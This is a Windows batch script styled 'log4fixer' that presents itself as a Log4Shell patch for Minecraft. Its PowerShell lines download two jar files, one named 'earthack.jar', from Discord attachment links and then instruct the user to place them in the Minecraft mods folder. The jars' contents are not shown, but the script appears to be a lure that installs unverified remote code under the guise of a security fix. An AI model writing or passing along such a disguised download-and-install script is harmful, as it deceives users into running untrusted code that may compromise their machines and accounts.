@echo off
@setlocal ENABLEDELAYEDEXPANSION
set ver=1.0
title log4fixer - V%ver%
cls
echo Welcome to log4fixer V%ver%
ping 192.0.2.2 -n 1 -w 1000 > nul
echo Made by Luwua_,Primooctopus33,And Spikestinger
ping 192.0.2.2 -n 1 -w 1000 > nul
echo Installing fix...
powershell -c "Invoke-WebRequest https://cdn.discordapp.com/attachments/1010766039405056112/1019721072238657647/earthack.jar -Method Get -outfile earthack.jar"
powershell -c "Invoke-WebRequest https://cdn.discordapp.com/attachments/1010766039405056112/1019721152907714561/log4patch.jar -Method Get -outfile log4patch.jar"
echo credits to Primooctopus33 and Spikestinger >> credits.txt
start credits.txt
start %appdata%\.minecraft\mods
echo the Log4Shell patch has been downloaded please drag earthack.jar and log4patch.jar into your mods folder
echo press any key 2 times to quit
pause >nul
pause >nul
exit